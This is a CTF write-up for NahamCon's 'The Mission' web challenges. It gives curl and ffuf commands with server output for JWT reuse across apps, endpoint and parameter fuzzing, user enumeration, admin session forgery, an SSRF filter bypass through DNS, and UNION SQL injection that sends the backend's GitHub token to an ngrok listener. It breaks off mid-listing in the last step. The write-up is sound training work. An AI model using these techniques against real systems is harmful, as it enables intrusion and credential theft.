# The Mission

## Description

> Welcome to The Mission, can you make your way through this huge CTF and capture 7 flags?
>
> For this series of challenges, content discovery and bruteforce (with simple wordlists) is allowed and permitted. With that said, a wordlist has been provided for you in the attachment downloads below.
>
> Win additional prizes by logging into Intigriti's platform and submitting your write up [here](https://app.intigriti.com/researcher/programs/intigriti/nahamconctfwelcomeflag/detail).
>
> Attachments: the_mission_wordlist.txt
>
> Connect with:
>
> - <http://challenge.nahamcon.com:xxxxx>

## Summary

The Mission challenge consists of 7 CTF challenges.
The web application has user login and registration functionalities in /app, but registration requires accessing a verification link sent to the email address, making it impossible to register a user.
We find /dev-app and /cmd URL paths from robots.txt.
By reusing the session JWT obtained in /dev-app, we can log in to /app (1. Knock Knock).
We fuzz /app/api/ to find /app/api/files, /app/api/me, /app/api/users, and /app/api/webhook.
Sending a POST method request to /app/api/users allows user enumeration (2. PostMan).
A user with user id 37 has admin privileges, so by generating a session JWT with user id 37 in /app-dev and using it in /app, we can log in as a user with admin privileges in /app (3. Johnhammond's Wasting Time).
We find the hidden file h6d8kw.env using the query parameter to filter the filename in /app/api/files (4. Not For Your Eyes).
By exploiting SSRF in /app/api/webhook and accessing the backend host, it reveals the /gitcheck URL path for the backend (5. Going SSuRFing).
We control the GitHub repository URL to be checked by exploiting SQL Injection and access any URL to obtain the GitHub Bearer token (6. GitGood at SSuRFing).
We see the GitHub repository URL using the GitHub Bearer token and retrieve the source code of the /cmd found in robots.txt.
We brute-force the $secret variable to find the_25mission.
Exploiting Path Traversal using `....//` to bypass filter, we can get /flag.txt (7. Take A Peak).

## Soltuion

### 1. Knock Knock

The provided URL lead to redirect to /app/login URL path:

![app-login.png](img/app-login.png)

Registered an user, it's Validation Required for my account by sent email:

![app-registered.png](img/app-registered.png)

We don't have the credentials to log in, and we couldn't find a way to bypass this.
So we will look for other information.

Looking at robots.txt, it reveals /dev-app and /cmd URL path:

```console
$ curl http://challenge.nahamcon.com:30781/robots.txt
User-agent: *
Disallow: /dev-app
Disallow: /cmd
```

The /dev-app/login screen is the same as /app/login:

![dev-app-login.png](img/dev-app-login.png)

Registered an user, However, it's not the same as Validation Required in /app/validate:

![dev-app-registered.png](img/dev-app-registered.png)

Looking at the response, Set-Cookie header is sent:

response:

```text
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 26 May 2024 08:22:18 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: dev-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.MVXc0x_5qMYMmU3orSxp7HfC1FOB9FXuutII-AP_eno; expires=Mon, 27-May-2024 08:22:18 GMT; Max-Age=86400; path=/
Location: /dev-app
Content-Length: 0


```

We suspect that the JWT got in /dev-app/ can be used in /app/.
The cookie name in /dev-app/ is `dev-token`, but we don't know the cookie name for /app/.

When we tried logging out from /dev-app/, the Set-Cookie response header instructed to delete the dev-token cookie by setting `dev-token=deleted`:

/dev-app/logout response:

```text
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 26 May 2024 08:35:41 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: dev-token=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Location: /dev-app
Content-Length: 0


```

We can get the cookie name by doing the same thing on /app.

/app/logout response:

```text
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 26 May 2024 08:39:07 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token-for-prod=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Location: /dev-app
Content-Length: 0


```

Since the cookie name for /app is `token-for-prod`, we'll set the cookie got from /dev-app/ with the name `token-for-prod`.

![set-cookie-as-token-for-prod.png](img/set-cookie-as-token-for-prod.png)

Then, access /app:

![access-app.png](img/access-app.png)

We can log in as a user I haven't seen before, `michael.johnson[at]nahamcon.ctf`.
Looking at the request in Burp Proxy, we saw a request sent to /app/api/me, and the response contained a flag.

/app/api/me response:

```text
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 26 May 2024 08:54:16 GMT
Content-Type: application/json
Connection: close
Content-Length: 135

{"user":{"id":3,"disabled":false,"email":"michael.johnson@nahamcon.ctf","role":"user","flag":"flag{925f2f867c0f46d986979c935aafca31}"}}
```

We submit the flag as Knock Knock challenge, accepted.

### 2. PostMan

Fuzzing /app/api/FUZZ, we found `files`, `me`, `users` and `webhook` URL path.

<details><summary>ffuf result:</summary>

```console
$ JWT='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.MVXc0x_5qMYMmU3orSxp7HfC1FOB9FXuutII-AP_eno'

$ ffuf -ic -u http://challenge.nahamcon.com:30781/app/api/FUZZ -b "token-for-prod=$JWT" -w the_mission_wordlist.txt -mc all -fr "API endpoint not found" -fs 162

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://challenge.nahamcon.com:30781/app/api/FUZZ
 :: Wordlist         : FUZZ: /root/Desktop/the_mission/the_mission_wordlist.txt
 :: Header           : Cookie: token-for-prod=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.MVXc0x_5qMYMmU3orSxp7HfC1FOB9FXuutII-AP_eno
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Regexp: API endpoint not found
 :: Filter           : Response size: 162
________________________________________________

files                   [Status: 403, Size: 57, Words: 8, Lines: 1, Duration: 240ms]
me                      [Status: 200, Size: 135, Words: 1, Lines: 1, Duration: 246ms]
users                   [Status: 403, Size: 57, Words: 8, Lines: 1, Duration: 240ms]
webhook                 [Status: 403, Size: 57, Words: 8, Lines: 1, Duration: 223ms]
:: Progress: [4736/4736] :: Job [1/1] :: 109 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

</details>

Changed HTTP method to POST, the `users` URL path returns 200 status code.

<details><summary>ffuf in POST result </summary>

```console
$ ffuf -ic -u http://challenge.nahamcon.com:30781/app/api/FUZZ -X POST -b "token-for-prod=$JWT" -w the_mission_wordlist.txt -mc all -fr "API endpoint not found" -fs 162

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://challenge.nahamcon.com:30781/app/api/FUZZ
 :: Wordlist         : FUZZ: /root/Desktop/the_mission/the_mission_wordlist.txt
 :: Header           : Cookie: token-for-prod=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.MVXc0x_5qMYMmU3orSxp7HfC1FOB9FXuutII-AP_eno
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 162
 :: Filter           : Regexp: API endpoint not found
________________________________________________

users                   [Status: 200, Size: 3944, Words: 1, Lines: 1, Duration: 216ms]
:: Progress: [4736/4736] :: Job [1/1] :: 113 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
```

</details>

So send a request to POST /app/api/users with cookie got.

<details><summary>POST /app/api/users response:</summary>

```console
$ curl -s http://challenge.nahamcon.com:30781/app/api/users -X POST -b "token-for-prod=$JWT" | jq
{
  "flag": "flag{d659fd652d42f3dde7ecb310d680c4ce}",
  "users": [
    {
      "id": 1,
      "disabled": false,
      "email": "john.doe@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 2,
      "disabled": false,
      "email": "jane.smith@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 3,
      "disabled": false,
      "email": "michael.johnson@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 4,
      "disabled": false,
      "email": "emily.davis@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 5,
      "disabled": false,
      "email": "chris.brown@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 6,
      "disabled": false,
      "email": "patricia.jones@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 7,
      "disabled": false,
      "email": "daniel.garcia@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 8,
      "disabled": false,
      "email": "linda.martinez@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 9,
      "disabled": false,
      "email": "robert.rodriguez@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 10,
      "disabled": false,
      "email": "barbara.hernandez@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 11,
      "disabled": false,
      "email": "david.lopez@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 12,
      "disabled": false,
      "email": "susan.gonzalez@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 13,
      "disabled": false,
      "email": "charles.wilson@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 14,
      "disabled": true,
      "email": "jessica.lee@nahamcon.ctf",
      "role": "admin"
    },
    {
      "id": 15,
      "disabled": false,
      "email": "joseph.walker@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 16,
      "disabled": false,
      "email": "sarah.hall@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 17,
      "disabled": false,
      "email": "thomas.allen@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 18,
      "disabled": false,
      "email": "karen.young@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 19,
      "disabled": false,
      "email": "mark.king@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 20,
      "disabled": false,
      "email": "nancy.wright@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 21,
      "disabled": false,
      "email": "donald.scott@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 22,
      "disabled": false,
      "email": "lisa.green@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 23,
      "disabled": false,
      "email": "steven.adams@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 24,
      "disabled": false,
      "email": "betty.baker@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 25,
      "disabled": false,
      "email": "paul.gonzales@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 26,
      "disabled": false,
      "email": "dorothy.nelson@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 27,
      "disabled": false,
      "email": "andrew.carter@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 28,
      "disabled": false,
      "email": "sandra.mitchell@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 29,
      "disabled": false,
      "email": "joshua.perez@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 30,
      "disabled": false,
      "email": "ashley.roberts@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 31,
      "disabled": false,
      "email": "kevin.turner@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 32,
      "disabled": false,
      "email": "kimberly.phillips@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 33,
      "disabled": false,
      "email": "brian.campbell@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 34,
      "disabled": false,
      "email": "michelle.parker@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 35,
      "disabled": false,
      "email": "george.evans@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 36,
      "disabled": false,
      "email": "rebecca.edwards@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 37,
      "disabled": false,
      "email": "edward.collins@nahamcon.ctf",
      "role": "admin"
    },
    {
      "id": 38,
      "disabled": false,
      "email": "laura.stewart@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 39,
      "disabled": false,
      "email": "ronald.sanchez@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 40,
      "disabled": false,
      "email": "maria.morris@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 41,
      "disabled": false,
      "email": "kenneth.rogers@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 42,
      "disabled": false,
      "email": "amanda.reed@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 43,
      "disabled": false,
      "email": "steven.cook@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 44,
      "disabled": false,
      "email": "donna.morgan@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 45,
      "disabled": false,
      "email": "charles.bell@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 46,
      "disabled": false,
      "email": "jennifer.murphy@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 47,
      "disabled": false,
      "email": "matthew.bailey@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 48,
      "disabled": false,
      "email": "betty.rivera@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 49,
      "disabled": false,
      "email": "anthony.cooper@nahamcon.ctf",
      "role": "user"
    },
    {
      "id": 50,
      "disabled": false,
      "email": "melissa.richardson@nahamcon.ctf",
      "role": "user"
    }
  ]
}
```

</details>

Got the flag and it's accepted as PostMan challenge.

### 3. Johnhammond's Wasting Time

In the previous challenge, we were able to log in as a user with ID 3 and the role of user.

```console
$ curl -s http://challenge.nahamcon.com:30781/app/api/me -b "token-for-prod=$JWT"
{"user":{"id":3,"disabled":false,"email":"michael.johnson@nahamcon.ctf","role":"user","flag":"flag{925f2f867c0f46d986979c935aafca31}"}} 
```

However, in PostMan challenge, it was possible to enumerate users in the /app/api/users URL path.
The users have attributes id, disable, email, and role.
The only user with disabled set to false and role set to admin is `edward.collins[at]nahamcon.ctf`, with id 37.
So we will try to log in as this user.

```json
    {
      "id": 37,
      "disabled": false,
      "email": "edward.collins@nahamcon.ctf",
      "role": "admin"
    },
```

The user ID of the cookie got from /dev-app/ is 3.
Using Burp Intruder, we repeatedly made user registration requests on /dev-app/ until a user with id 37 was created.
And then, got the following JWT: `dev-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozN30.KEGN0oBp_Xvhc_K_0aJW3Uhv2H3B4VrjT3rMsJwWGjA`

Send a request for /app/api/me with the cookie, we can obtain the flag.

```console
$ JWT='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozN30.KEGN0oBp_Xvhc_K_0aJW3Uhv2H3B4VrjT3rMsJwWGjA'

$ curl -s http://challenge.nahamcon.com:30781/app/api/me -b "token-for-prod=$JWT"
{"user":{"id":37,"disabled":false,"email":"edward.collins@nahamcon.ctf","role":"admin","admin_flag":"flag{df58cd2ca704c7824a55ce14f86f5878}"}}
```

The flag is accepted as Johnhammond's Wasting Time challenge.

### 4. Not For Your Eyes

We use the admin cookie got from the previous Johnhammond's Wasting Time challenge to make a request to the /app/api/files URL path.

```bash
curl -s http://challenge.nahamcon.com:30781/app/api/files -b "token-for-prod=$JWT" | jq
```

<details><summary>/app/api/files response:</summary>

```json
{
  "files": [
    {
      "name": "css",
      "type": "directory",
      "files": [
        {
          "name": "bootstrap.min.css",
          "type": "file"
        }
      ]
    },
    {
      "name": "index.php",
      "type": "file"
    },
    {
      "name": "js",
      "type": "directory",
      "files": [
        {
          "name": "bootstrap.min.js",
          "type": "file"
        },
        {
          "name": "jquery.min.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "l",
      "type": "directory",
      "files": [
        {
          "name": "index.php",
          "type": "file"
        },
        {
          "name": "o",
          "type": "file"
        }
      ]
    },
    {
      "name": "robots.txt",
      "type": "file"
    }
  ],
  "message": "Directories found: 3, Files Found: 7, Files Hidden For Security: 1. Tip: Use the filter parameter to select specific file types."
}
```

</details>

The file information is sent.
It seems that there is a hidden file as `Files Hidden For Security: 1` and filter parameter as `Tip: Use the filter parameter to select specific file types.`
So try to bruteforce due to find a hidden file using filter parameter.

<details><summary>Fuzzing result:</summary>

```console
$ ffuf -ic -u http://challenge.nahamcon.com:30781/app/api/files?filter=FUZZ -b "token-for-prod=$JWT" -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -mc all -fr "Files Hidden For Security: 0"
(snip)
&                       [Status: 200, Size: 538, Words: 21, Lines: 1, Duration: 264ms]
                        [Status: 200, Size: 538, Words: 21, Lines: 1, Duration: 307ms]
v                       [Status: 200, Size: 284, Words: 21, Lines: 1, Duration: 307ms]
:: Progress: [94/94] :: Job [1/1] :: 94 req/sec :: Duration: [0:00:01] :: Errors: 0 ::

$ # found v so try FUZZv

$ ffuf -ic -u http://challenge.nahamcon.com:30781/app/api/files?filter=FUZZv -b "token-for-prod=$JWT" -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -mc all -fr "Files Hidden For Security: 0"
(snip)
&                       [Status: 200, Size: 538, Words: 21, Lines: 1, Duration: 307ms]
                        [Status: 200, Size: 284, Words: 21, Lines: 1, Duration: 305ms]
n                       [Status: 200, Size: 284, Words: 21, Lines: 1, Duration: 1017ms]
:: Progress: [94/94] :: Job [1/1] :: 91 req/sec :: Duration: [0:00:01] :: Errors: 0 ::

$ # found n so try FUZZnv

...

$ ffuf -ic -u http://challenge.nahamcon.com:30781/app/api/files?filter=FUZZh6d8kw.env -b "token-for-prod=$JWT" -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -mc all -fr "Files Hidden For Security: 0"
(snip)
&                       [Status: 200, Size: 538, Words: 21, Lines: 1, Duration: 208ms]
                        [Status: 200, Size: 284, Words: 21, Lines: 1, Duration: 216ms]
:: Progress: [94/94] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

</details>

Got hidden file named `h6d8kw.env`.

```console
$ curl -s http://challenge.nahamcon.com:30781/h6d8kw.env
WEBSITE_NAME=MAIN SITE
WEBSITE_PORT=80
BACKEND_NAME=BACKEND
BACKEND_PORT=80
BACKEND_HOST_MATCH=^([a-z0-9]{1,})\.intigriti\.com
FLAG=flag{74b281540fd0b66f9bf689e340c36ef8} 
```

The flag is accepted as Not For Your Eyes challenge.

### 5. Going SSuRFing

Sending a request for the /app/api/webhook URL path.

```console
$ curl -s http://challenge.nahamcon.com:30781/app/api/webhook -b "token-for-prod=$JWT"
{"error":"Missing required query string"}
```

A query string is required but we don't know the parameter name so let's fuzzing.

```console
$ ffuf -ic -u http://challenge.nahamcon.com:30781/app/api/webhook?FUZZ=1 -b "token-for-prod=$JWT" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -fr "Missing required query string"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://challenge.nahamcon.com:30781/app/api/webhook?FUZZ=1
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Header           : Cookie: token-for-prod=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozN30.KEGN0oBp_Xvhc_K_0aJW3Uhv2H3B4VrjT3rMsJwWGjA
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Regexp: Missing required query string
________________________________________________

url                     [Status: 200, Size: 57, Words: 9, Lines: 1, Duration: 216ms]
:: Progress: [4727/4727] :: Job [1/1] :: 140 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
```

Got the `url` query string.
As the name of this challenge name SSuRFing, the webhook has an SSRF vulnerability.
We'll specify <http://127.0.0.1> in the url query string to send a request to <http://127.0.0.1> from the server.

```console
$ curl -s http://challenge.nahamcon.com:30781/app/api/webhook?url=http://127.0.0.1 -b "token-for-prod=$JWT"
{"contents":"Invalid Host"} 
```

It's failed.

Here, let's take a look at the h6d8kw.env file got in the previous Not For Your Eyes challenge.

```text
BACKEND_HOST_MATCH=^([a-z0-9]{1,})\.intigriti\.com
```

The h6d8kw.env file contains a regular expression for BACKEND_HOST_MATCH.
Since this regular expression does not end with `$`, I assume that requests will be sent to the backend if the domain starts with `foobar.intigriti.com`.
Therefore, I will add an A record to my personal domain, `foobar.intigriti.com.<mydomain>`, pointing to 127.0.0.1, and then make it accessible.

```console
$ dig +noall +answer test1.intigriti.com.<yourdomain>
test1.intigriti.com.<yourdomain>. 3575 IN A   127.0.0.1

$ curl -s http://challenge.nahamcon.com:30781/app/api/webhook?url=http://test1.intigriti.com.<yourdomain> -b "token-for-prod=$JWT"
{"contents":"{\"message\":\"Backend API Server\",\"flag\":\"flag{5686771192752953a36abf15bd264aba}\",\"paths\":[{\"url\":\"\\\/gitcheck\",\"description\":\"Checks for the latest version of our installed GitHub repos\"}]}"}
```

The flag is accepted as Going SSuRFing challenge.

### 6. GitGood at SSuRFing

In previous Going SSuRFing challenge, we got `{\"url\":\"\\\/gitcheck\",\"description\":\"Checks for the latest version of our installed GitHub repos\"}` response so sending a request for /gitcheck URL path.

```console
$ curl -s "http://challenge.nahamcon.com:30781/app/api/webhook?url=http://test1.intigriti.com.<yourdomain>/gitcheck" -b "token-for-prod=$JWT"
{"contents":"{\"error\":\"Missing id parameter\"}"}

$ curl -s "http://challenge.nahamcon.com:30781/app/api/webhook?url=http://test1.intigriti.com.<yourdomain>/gitcheck?id=1" -b "token-for-prod=$JWT"
{"contents":"{\"error\":\"Job is already set as completed\"}"}

$ curl -s "http://challenge.nahamcon.com:30781/app/api/webhook?url=http://test1.intigriti.com.<yourdomain>/gitcheck?id=2" -b "token-for-prod=$JWT"
{"contents":"{\"error\":\"Job id not found\"}"}

$ curl -s "http://challenge.nahamcon.com:30781/app/api/webhook?url=http://test1.intigriti.com.<yourdomain>/gitcheck?id=2'" -b "token-for-prod=$JWT"
{"contents":"{\"error\":\"Server Error\"}"}

$ curl -s "http://challenge.nahamcon.com:30781/app/api/webhook?url=http://test1.intigriti.com.<yourdomain>/gitcheck?id=1+OR+1='2'" -b "token-for-prod=$JWT"
{"contents":"{\"error\":\"Job is already set as completed\"}"}

$ curl -s "http://challenge.nahamcon.com:30781/app/api/webhook?url=http://test1.intigriti.com.<yourdomain>/gitcheck?id=1+AND+1='2'" -b "token-for-prod=$JWT"
{"contents":"{\"error\":\"Job id not found\"}"}
```

We detected SQL Injection vulnerability.
Try `UNION SELECT` payload:

```console
$ curl -s "http://challenge.nahamcon.com:30781/app/api/webhook?url=http://test1.intigriti.com.<yourdomain>/gitcheck?id=0+UNION+SELECT+1,2,3" -b "token-for-prod=$JWT"
{"contents":"{\"error\":\"Job is already set as completed\"}"}

$ curl -s "http://challenge.nahamcon.com:30781/app/api/webhook?url=http://test1.intigriti.com.<yourdomain>/gitcheck?id=0+UNION+SELECT+0,2,3" -b "token-for-prod=$JWT"
{"contents":"{\"error\":\"Job is already set as completed\"}"}

$ curl -s "http://challenge.nahamcon.com:30781/app/api/webhook?url=http://test1.intigriti.com.<yourdomain>/gitcheck?id=0+UNION+SELECT+0,0,3" -b "token-for-prod=$JWT"
{"contents":"{\"error\":\"HTTP scheme missing\"}"}

$ curl -s "http://challenge.nahamcon.com:30781/app/api/webhook?url=http://test1.intigriti.com.<yourdomain>/gitcheck?id=0+UNION+SELECT+0,0,'http://example.com/'" -b "token-for-prod=$JWT"
{"contents":"{\"error\":\"Invalid Response, Expecting JSON Response\"}"}

$ curl -s "http://challenge.nahamcon.com:30781/app/api/webhook?url=http://test1.intigriti.com.<yourdomain>/gitcheck?id=0+UNION+SELECT+0,0,'http://0.tcp.jp.ngrok.io:11995/'" -b "token-for-prod=$JWT"
```

When using the third value of UNION SELECT as a URL, a request is sent to the URL.
To check the request contents, we'll listen with netcat on my machine and make it accessible globally using Ngrok.
Then, we'll have the server access the Ngrok URL.

request:

```text
$ nc -lnvp 80
listening on [any] 80 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 54578
GET / HTTP/1.1
Host: 0.tcp.jp.ngrok.io:11995
Accept: */*
User-Agent: curl
Authorization: Bearer github_pat_11BIS(snip)
Flag: flag{ed3d949912f8918009a2ba7382c5406a}
```

The flag is accepted as GitGood at SSuRFing challenge.

### 7. Take A Peak

In the previous GitGood at SSuRFing challenge, we can get the GitHub Bearer token.
Using the token, checking the repositories owned by that user who issued that token.

<details><summary>GitHub API result:</summary>

```console
$ curl -H "Authorization: Bearer github_pat_11BIS(snip)" https://api.github.com/user/repos
[
  {
    "id": 802856451,
    "node_id": "R_kgDOL9qeAw",
    "name": "server-code",
    "full_name": "NahamConIndustries/server-code",
    "private": true,
    "owner": {
      "login": "NahamConIndustries",
      "id": 170246352,
      "node_id": "U_kgDOCiXA0A",
      "avatar_url": "https://avatars.githubusercontent.com/u/170246352?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/NahamConIndustries",
      "html_url": "https://github.com/NahamConIndustries",
      "followers_url": "https://api.github.com/users/NahamConIndustries/followers",
      "following_url": "https://api.github.com/users/NahamConIndustries/following{/other_user}",
      "gists_url": "https://api.github.com/users/NahamConIndustries/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/NahamConIndustries/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/NahamConIndustries/subscriptions",
      "organizations_url": "https://api.github.com/users/NahamConIndustries/orgs",
      "repos_url": "https://api.github.com/users/NahamConIndustries/repos",
      "events_url": "https://api.github.com/users/NahamConIndustries/events{/privacy}",
      "received_events_url": "https://api.github.com/users/NahamConIndustries/received_events",
      "type": "User",
      "site_admin": false
    },
    "html_url": "https://github.com/NahamConIndustries/server-code",
    "description": null,
    "fork": false,
    "url": "https://api.github.com/repos/NahamConIndustries/server-code",
    "forks_url": "https://api.github.com/repos/NahamConIndustries/server-code/forks",
    "keys_url": "https://api.github.com/repos/NahamConIndustries/server-code/keys{/key_id}",
    "collaborators_url": "https://api.github.com/repos/NahamConIndustries/server-code/collaborators{/collaborator}",
    "teams_url": "https://api.github.com/repos/NahamConIndustries/server-code/teams",
    "hooks_url": "https://api.github.com/repos/NahamConIndustries/server-code/hooks",
    "issue_events_url": "https://api.github.com/repos/NahamConIndustries/server-code/issues/events{/number}",
    "events_url": "https://api.github.com/repos/NahamConIndustries/server-code/events",
    "assignees_url": "https://api.github.com/repos/NahamConIndustries/server-code/assignees{/user}",
    "branches_url": "https://api.github.com/repos/NahamConIndustries/server-code/branches{/branch}",
    "tags_url": "https://api.github.com/repos/NahamConIndustries/server-code/tags",
    "blobs_url": "https://api.github.com/repos/NahamConIndustries/server-code/git/blobs{/sha}",
    "git_tags_url": "https://api.github.com/repos/NahamConIndustries/server-code/git/tags{/sha}",
    "git_refs_url": "https://api.github.com/repos/NahamConIndustries/server-code/git/refs{/sha}",
    "trees_url": "https://api.github.com/repos/NahamConIndustries/server-code/git/trees{/sha}",
    "statuses_url": "https://api.github.com/repos/NahamConIndustries/server-code/statuses/{sha}",
    "languages_url": "https://api.github.com/repos/NahamConIndustries/server-code/languages",
    "stargazers_url": "https://api.github.com/repos/NahamConIndustries/server-code/stargazers",
    "contributors_url": "https://api.github.com/repos/NahamConIndustries/server-code/contributors",
    "subscribers_url": "https://api.github.com/repos/NahamConIndustries/server-code/subscribers",
    "subscription_url": "https://api.github.com/repos/NahamConIndustries/server-code/subscription",
    "commits_url": "https://api.github.com/repos/NahamConIndustries/server-code/commits{/sha}",
    "git_commits_url": "https://api.github.com/repos/NahamConIndustries/server-code/git/commits{/sha}",
    "comments_url": "https://api.github.com/repos/NahamConIndustries/server-code/comments{/number}",
    "issue_comment_url": "https://api.github.com/repos/NahamConIndustries/server-code/issues/comments{/number}",
    "contents_url": "https://api.github.com/repos/NahamConIndustries/server-code/contents/{+path}",
    "compare_url": "https://api.github.com/repos/NahamConIndustries/server-code/compare/{base}...{head}",
    "merges_url": "https://api.github.com/repos/NahamConIndustries/server-code/merges",
    "archive_url": "https://api.github.com/repos/NahamConIndustries/server-code/{archive_format}{/ref}",
    "downloads_url": "https://api.github.com/repos/NahamConIndustries/server-code/downloads",
    "issues_url": "https://api.github.com/repos/NahamConIndustries/server-code/issues{/number}",
    "pulls_url": "https://api.github.com/repos/NahamConIndustries/server-code/pulls{/number}",
    "milestones_url": "https://api.github.com/repos/NahamConIndustries/server-code/milestones{/number}",
    "notifications_url": "https://api.github.com/repos/NahamConIndustries/server-code/notifications{?since,all,participating}",
    "labels_url": "https://api.github.com/repos/NahamConIndustries/server-code/labels{/name}",
    "releases_url": "https://api.github.com/repos/NahamConIndustries/server-code/releases{/id}",
    "deployments_url": "https://api.github.com/repos/NahamConIndustries/server-code/deployments",
    "created_at": "2024-05-19T13:07:14Z",
    "updated_at": "2024-05-22T19:39:18Z",
    "pushed_at": "2024-05-22T19:39:14Z",
    "git_url": "git://github.com/NahamConIndustries/server-code.git",
    "ssh_url": "git@github.com:NahamConIndustries/server-code.git",
    "clone_url": "https://github.com/NahamConIndustries/server-code.git",
    "svn_url": "https://github.com/NahamConIndustries/server-code",
    "homepage": null,
    "size": 2,
    "stargazers_count": 0,
    "watchers_count": 0,
    "language": "PHP",
    "has_issues": true,
    "has_projects": true,
    "has_downloads": true,
    "has_wiki": false,
